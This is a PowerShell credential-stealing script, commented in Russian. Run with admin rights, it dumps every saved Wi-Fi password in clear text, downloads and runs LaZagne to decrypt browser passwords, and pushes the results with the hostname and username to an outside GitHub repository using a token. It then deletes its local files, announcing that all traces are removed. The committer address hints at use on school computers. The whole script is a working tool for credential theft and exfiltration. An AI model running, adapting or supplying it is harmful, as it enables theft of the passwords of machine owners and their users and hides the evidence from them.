# =============================================
# WiFi + Browser Passwords v2.3 (с расшифровкой)
# =============================================

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "❌ Запусти от имени администратора!" -ForegroundColor Red
    exit 1
}

$RepoUrl = "https://github.com/DilanBlue/wifi.git"
$Token   = $env:GH_TOKEN

if (-not $Token) {
    Write-Host "❌ GH_TOKEN не передан!" -ForegroundColor Red
    exit 1
}

$exportDir = "C:\WiFiExport"
$hostname = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$filePath = Join-Path $exportDir "${hostname}_${timestamp}.txt"

New-Item -ItemType Directory -Force -Path $exportDir | Out-Null

Write-Host "🔍 Извлекаем Wi-Fi и пароли браузеров..." -ForegroundColor Cyan

$oldEncoding = [Console]::OutputEncoding
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# ====================== WI-FI ======================
$profiles = (netsh wlan show profiles) | Select-String ':\s+(.+?)\s*$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

$results = @()
$foundWiFi = 0

foreach ($p in $profiles) {
    if (-not $p) { continue }
    $info = netsh wlan show profile name="$p" key=clear
    $pass = "НЕ НАЙДЕН"
    $match = $info | Select-String "(Содержимое ключа|Key Content)[\s:]+(.+)"
    if ($match) {
        $pass = $match.Matches.Groups[2].Value.Trim()
        if ($pass.Length -gt 3) { $foundWiFi++ }
    }
    $results += "=== WI-FI ==="
    $results += "SSID     : $p"
    $results += "Пароль   : $pass"
    $results += "----------------------------------------"
}

# ====================== BROWSER PASSWORDS (LaZagne) ======================
Write-Host "🔓 Пытаемся расшифровать пароли браузеров..." -ForegroundColor Yellow

$browserResults = @()

try {
    # Скачиваем LaZagne (лёгкая portable версия)
    $lazagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
    $lazagnePath = Join-Path $exportDir "lz.exe"
    
    Invoke-WebRequest -Uri $lazagneUrl -OutFile $lazagnePath -UseBasicParsing

    # Запускаем LaZagne только для браузеров
    $output = & $lazagnePath browsers -quiet 2>$null
    
    if ($output) {
        $browserResults += "=== BROWSER PASSWORDS (LaZagne) ==="
        $browserResults += $output
        $browserResults += "----------------------------------------"
    } else {
        $browserResults += "LaZagne не нашёл сохранённых паролей или браузеры открыты."
    }
} catch {
    $browserResults += "Ошибка при запуске LaZagne: $($_.Exception.Message)"
}

$results += $browserResults

[Console]::OutputEncoding = $oldEncoding

# ====================== HEADER ======================
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$username = $env:USERNAME

$header = @"
FULL DUMP v2.3 - $hostname
========================================
Hostname     : $hostname
Пользователь : $username
Windows      : $os
Дата         : $(Get-Date)
WiFi паролей : $foundWiFi
========================================
"@

$header + ($results -join "`n") | Out-File -Encoding UTF8 -FilePath $filePath

Write-Host "✅ Wi-Fi: $foundWiFi | Браузеры обработаны" -ForegroundColor Green

# ====================== PUSH ======================
try {
    $repoDir = Join-Path $exportDir "repo"
    if (!(Test-Path $repoDir)) { git clone $RepoUrl $repoDir }

    Copy-Item $filePath $repoDir -Force

    Push-Location $repoDir
    git config user.name "WiFi-Exporter"
    git config user.email "exporter@school.local"
    git add "*.txt"
    git commit -m "Full dump $hostname $timestamp" 2>$null
    git push "https://$Token@github.com/DilanBlue/wifi.git" main 2>$null
} finally {
    Pop-Location
}

# ====================== АВТООЧИСТКА ======================
Remove-Item $exportDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "🧹 Все следы удалены" -ForegroundColor Gray
